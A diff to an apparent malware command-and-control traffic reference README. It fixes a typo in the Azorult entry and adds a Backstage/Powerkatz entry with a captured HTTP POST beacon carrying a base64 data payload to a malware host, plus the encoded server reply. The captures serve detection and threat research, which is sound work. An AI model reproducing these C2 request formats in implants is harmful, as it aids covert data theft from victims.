@@ -158,7 +158,7 @@ con|1597172877123|285|ZTkyNGVhNzkxMjU1N2RlZHxKT05BVEhBTi1QQ1xKb25hdGhhbnwpMiBEdW
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/avemaria2.png "Avemaria")
 
 #### Azorult
-POST retrieve metod, unique pattern with lot's of '/' and ')'
+POST retrieve method, unique pattern with lot's of '/' and ')'
 ~~~
 POST /index.php HTTP/1.1
 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.1)
@@ -169,6 +169,30 @@ Cache-Control: no-cache
 J/.8/.:/.</.?/.>O.(8.I/.>/.9/.>K.>8.N/.I/.;/.</.;N.>:.NL.?N.>8.(9.L/.8/.</.4/.4/.I/.?/.>H.(9.(9.(9.(9.I
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/azorult.png "Azorult")
+
+#### Backstage aka Powerkatz
+~~~
+POST /index.php/api/fb HTTP/1.1
+Connection: Keep-Alive
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36
+Content-Length: 933
+Host: www.wdsfw34erf93.com
+
+data=aHpyTUxwSW1cNTw0ZXFVTV1GTDlMRkxsT0RyTUxwSXZlSUVraFo0b2VxVVFdW1VyZTVVfUxtcmpMbEx2RmpubFw1PHlkNW9vVnFReWVsTDlMRk1lW0o4Z0xJe3hMbHpORlZNcFxxWX1dW016XFtRfUxtcmpMbEx2RmpubF1xTXNdWjhuZjM4NGVWTDlMRkx6TGx6TkZWTXBmcDx3TG1yakxwWTddVkx2RmpubGRKSX1WSjx3XVlFa101WGxSbERsUEZMdkZqbmxkWjh9XDU8eWQ1b29WcVF5ZWxMOUxGTWVbSjhnTEl7eExsek5GVk1zZXFRNGY1WXxmSkl9ZnxMOUxGTGxPRHJNTHBvfVRwM2xSbERsTGx6TkZWTXNmM1FyZnA8d11YWTdkW1EzTG1yakxtSGxPRHJNTHBvfVdKPHFkWjhvXUZMOUxGTHpMbHpORlZNc2Y1b3hmNlVrZUp6bFJsRGxQRkx2RmpubGU1TXRYNm99Vlo4cGV8TDlMS3ZORlRubF1wb3xmNlVMXUpVV11bTXNcWntSZ1o0bF1bTGxSbERsUUpUNFBXUHpQfUR9UEdQelBtRH1QV0x6UG1EfFBHTHpQbUR8UEdMelBtRHxQR0x6UG1EfFBGTHZGam5NTHA0a1w2UGxSbEVlRmpuTUZWTDRQbXI0UUdyelBHcntQfXI3UX1yelFWTGpGam5NW1Z6TkZUbmxmNm99Z0pZd1lwWXxmNW95ZWxMOUxGTVtkWjhuZTZnfVE0UVRQWDx8VTZNb1xbVW9mbEVHZUpvb2VxVGxMRHJNaVZ6TkZWTXpcW29NZXBdeUxtcmpMbEx2RmpubGZwSXhdRkw5TEZMe1F9ajdRfEx2RmpubGdab25MbXJqTG1MelFsTHZGam5sZ3BZfGY1b3llbEw5TEZMNUxsRE5pVkRO
+
+HTTP/1.1 200 OK
+Date: Wed, 23 Sep 2020 12:30:29 GMT
+Server: Apache
+Upgrade: h2
+Connection: Upgrade, close
+Vary: Accept-Encoding
+Transfer-Encoding: chunked
+Content-Type: text/html; charset=UTF-8
+
+aHxNfWdKSTNnW1BsUm1JPA==
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/backstage.png "Backstage")
 
 #### Bandook RAT
 ~~~
